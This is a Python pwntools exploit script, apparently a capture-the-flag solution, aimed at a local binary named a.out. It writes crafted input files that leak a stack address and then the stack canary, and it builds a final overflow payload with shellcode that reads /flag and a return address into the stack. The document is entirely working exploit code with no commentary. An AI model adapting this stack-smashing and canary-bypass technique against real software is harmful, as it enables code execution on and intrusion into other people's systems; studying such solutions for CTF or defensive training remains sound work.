#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


leak_payload = b'a' * 255 + b'b' + b'\xff' * 8


with open('leak_file', 'wb') as f:
    f.write(leak_payload)

p = gdb.debug('./a.out', '''
              b close
              c
              ''')

p.sendline(b"leak_file")
p.sendline(b"0")
p.recvuntil(b'aaaaab')
p.recv(8) # throwaway
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))


print(f"Leaked stack address: {hex(stack_leak)}")

canary_payload = asm(shellcraft.cat2("/flag")).ljust(256 + 7, b'a') + b'b' + p64(stack_leak + 0x1a9)


with open('canary_file', 'wb') as f:
    f.write(canary_payload)

p.sendline(b"canary_file")
p.sendline(b"0")
p.recvuntil(b"offset: ")
canary = u64(p.recv(7).rjust(8, b'\x00'))
print(f"Leaked canary: {hex(canary)}")

exploit_payload = asm(shellcraft.cat2("/flag")).ljust(256 + 7, b'a') + b'b' + p64(stack_leak + 0x1a0)
exploit_payload += b'a' * 144 + p32(3)
exploit_payload += cyclic(0x1a8 - len(exploit_payload)) + p64(canary) + b'd' * 8 + p64(stack_leak)

with open('exploit_file', 'wb') as f:
    f.write(exploit_payload)

p.sendline(b"exploit_file")
p.sendline(b"0")

p.sendline(b'EXIT')
p.interactive()
